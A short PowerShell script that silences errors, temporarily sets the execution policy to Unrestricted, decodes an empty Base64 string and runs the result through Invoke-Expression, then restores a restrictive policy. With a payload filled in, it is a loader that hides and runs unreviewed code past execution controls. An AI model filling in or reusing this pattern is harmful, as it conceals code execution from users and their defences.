$ErrorActionPreference = "SilentlyContinue"
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser -Force
$currentPolicy = Get-ExecutionPolicy -Scope LocalMachine
Start-Sleep 1
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser -Force

$ecoScr = ""
$decoScr = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ecoScr))
Invoke-Expression $decoScr

Start-Sleep 1
Set-ExecutionPolicy -ExecutionPolicy $currentPolicy -Scope CurrentUser -Force
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope CurrentUser -Force
